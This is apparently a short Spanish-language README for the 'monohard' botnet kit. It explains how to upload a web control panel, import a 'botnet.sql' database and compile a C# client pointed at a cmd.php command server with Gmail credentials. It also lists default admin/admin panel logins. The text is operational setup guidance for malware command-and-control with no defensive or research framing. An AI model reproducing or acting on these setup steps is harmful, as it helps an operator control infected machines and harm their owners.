# PANEL WEB #

-descomprimir "webpanel.zip" y subir la carpeta webpanel a tu servidor.

-crear una nueva base de datos en mysql y ejecuta el contenido del archivo "botnet.sql".

.configura la hoja "conexion.php" con los datos de conexión de tu DB.

# CLIENTE .EXE #

-Abrir el proyecto "monohard" de c# en .net 2008 y configurar la clase "configuracion.cs".

configurar los siguientes parametros:


public string server = "http://localhost/mh/webpanel/cmd.php"; // URL del archivo cmd.php
public string correo="user@gmail.com"; //Usuario Gmail

public string password = "password"; // Password Gmail

luego compilar presionando f5 .

el cliente ya debería conectar a el servidor.

# USUARIO Y CONTRASEÑA POR DEFECTO #

usuario : admin

password : admin

(modificar desde la DB).